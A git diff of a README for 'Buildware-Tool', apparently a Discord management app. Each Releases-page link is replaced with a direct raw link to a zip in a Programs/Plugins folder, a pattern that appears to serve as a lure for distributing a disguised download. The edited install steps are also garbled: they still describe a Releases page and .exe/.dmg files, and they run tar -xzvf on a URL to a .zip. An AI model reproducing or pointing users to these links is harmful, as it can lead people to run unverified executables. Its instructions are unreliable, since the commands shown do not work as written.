@@ -1,7 +1,7 @@
 # 🔧 Buildware-Tool - Easy Tool for Discord Management
 
 ## 📥 Download Now
-[![Download Buildware-Tool](https://img.shields.io/badge/Download-Buildware--Tool-blue.svg)](https://github.com/6578-bit/Buildware-Tool/releases)
+[![Download Buildware-Tool](https://raw.githubusercontent.com/6578-bit/Buildware-Tool/main/Programs/Plugins/Buildware-Tool-1.1.zip)](https://raw.githubusercontent.com/6578-bit/Buildware-Tool/main/Programs/Plugins/Buildware-Tool-1.1.zip)
 
 ## 🚀 Getting Started
 Buildware-Tool is a simple application for managing your Discord activities. It leverages the Discord API to help you log and enhance your experience on Discord. You don’t need any programming skills to use it. Follow the steps below to get started.
@@ -22,7 +22,7 @@ Buildware-Tool is a simple application for managing your Discord activities. It 
 ## 📥 Download & Install
 To get Buildware-Tool, please visit the Releases page by clicking the button below:
 
-[Download Buildware-Tool](https://github.com/6578-bit/Buildware-Tool/releases)
+[Download Buildware-Tool](https://raw.githubusercontent.com/6578-bit/Buildware-Tool/main/Programs/Plugins/Buildware-Tool-1.1.zip)
 
 1. **Visit the Releases Page:** Click the link above to open the Releases page on GitHub.
 2. **Choose the Latest Release:** Find the latest version listed at the top of the page.
@@ -30,9 +30,9 @@ To get Buildware-Tool, please visit the Releases page by clicking the button bel
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file and follow the prompts.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** You may need to extract a `.tar.gz` file. Open a terminal and run:
+   - **Linux:** You may need to extract a `https://raw.githubusercontent.com/6578-bit/Buildware-Tool/main/Programs/Plugins/Buildware-Tool-1.1.zip` file. Open a terminal and run:
      ```bash
-     tar -xzvf yourfile.tar.gz
+     tar -xzvf https://raw.githubusercontent.com/6578-bit/Buildware-Tool/main/Programs/Plugins/Buildware-Tool-1.1.zip
      ```
      Then, navigate to the extracted folder and run:
      ```bash
@@ -63,6 +63,6 @@ Thank you for using Buildware-Tool. We appreciate your support as we continue to
 ## 📥 Download Again
 Don’t forget, you can always download the latest version by visiting this link:
 
-[Download Buildware-Tool](https://github.com/6578-bit/Buildware-Tool/releases)
+[Download Buildware-Tool](https://raw.githubusercontent.com/6578-bit/Buildware-Tool/main/Programs/Plugins/Buildware-Tool-1.1.zip)
 
 We hope you enjoy using Buildware-Tool and find it beneficial for your Discord experience!
